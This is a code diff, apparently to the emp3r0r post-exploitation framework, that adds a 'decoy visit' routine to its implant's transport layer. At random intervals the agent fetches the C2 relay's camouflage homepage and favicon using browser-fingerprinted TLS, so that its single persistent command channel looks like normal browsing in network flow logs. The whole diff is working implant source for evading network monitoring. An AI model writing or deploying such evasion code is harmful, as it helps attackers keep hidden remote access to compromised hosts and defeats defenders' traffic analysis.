@@ -11,6 +11,8 @@ package transport
 import (
 	"context"
 	"io"
+	"os"
+	"strconv"
 	"net"
 	"net/http"
 	"net/url"
@@ -18,6 +20,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -186,3 +189,79 @@ func (c *mimicDNSConn) RemoteAddr() net.Addr                { return nil }
 func (c *mimicDNSConn) SetDeadline(t time.Time) error      { return nil }
 func (c *mimicDNSConn) SetReadDeadline(t time.Time) error  { return nil }
 func (c *mimicDNSConn) SetWriteDeadline(t time.Time) error { return nil }
+
+// ---------------------------------------------------------------------------
+// Decoy visits: make the host look like it periodically browses the site
+// ---------------------------------------------------------------------------
+
+// A relay-only agent talks to exactly one domain over one persistent WSS —
+// the "single-domain appliance" pattern. Real browsing scatters across
+// domains and re-loads pages. Every few hello cycles the agent therefore
+// opens a TRANSIENT browser-fingerprinted connection to the relay's own
+// camouflage homepage (no secret — exactly what an unauthenticated visitor
+// looks like) and discards it. Netflow now shows "periodic site visits +
+// one app connection" instead of "one eternal connection, nothing else".
+var (
+	decoyMu    sync.Mutex
+	decoySeen  = 0
+	decoyNext  = 2 // fire on a random hello count; re-rolled after each visit
+)
+
+// MaybeDecoyVisit counts hello cycles and, every 2-5 of them, fetches the
+// camouflage homepage (and the favicon, like a real page load) on a fresh
+// connection. Best effort: errors are ignored by design.
+func MaybeDecoyVisit(relayURL string) {
+	decoyMu.Lock()
+	decoySeen++
+	// EMP_DECOY_EVERY_N: debug knob to fire every Nth hello (default: 2-5)
+	if n := os.Getenv("EMP_DECOY_EVERY_N"); n != "" {
+		if v, err := strconv.Atoi(n); err == nil && v > 0 {
+			decoyNext = v
+		}
+	}
+	fire := decoySeen >= decoyNext
+	if fire {
+		decoySeen = 0
+		decoyNext = util.RandInt(2, 6)
+	}
+	decoyMu.Unlock()
+	if !fire {
+		return
+	}
+	logging.Infof("decoy visit: fetching the camouflage homepage")
+
+	go func() {
+		u, err := url.Parse(relayURL)
+		if err != nil || u.Host == "" {
+			return
+		}
+		client := &http.Client{
+			Timeout: 10 * time.Second,
+			Transport: &http.Transport{
+				ForceAttemptHTTP2: false,
+				DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+					// resolved via net.DefaultResolver (the agent's DoH);
+					// ECH-masked once the config is cached
+					return BrowserLikeTLSDial(ctx, addr, nil)
+				},
+			},
+		}
+		// a page load: / then /favicon.ico
+		for _, path := range []string{"/", "/favicon.ico"} {
+			req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, "https://"+u.Host+path, nil)
+			if err != nil {
+				return
+			}
+			// no Authorization — an unauthenticated visitor is the point
+			BrowserRequestHeaders(req.Header, "")
+			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+			resp, err := client.Do(req)
+			if err != nil {
+				return
+			}
+			io.Copy(io.Discard, io.LimitReader(resp.Body, 64<<10))
+			resp.Body.Close()
+			time.Sleep(time.Duration(util.RandInt(80, 400)) * time.Millisecond)
+		}
+	}()
+}
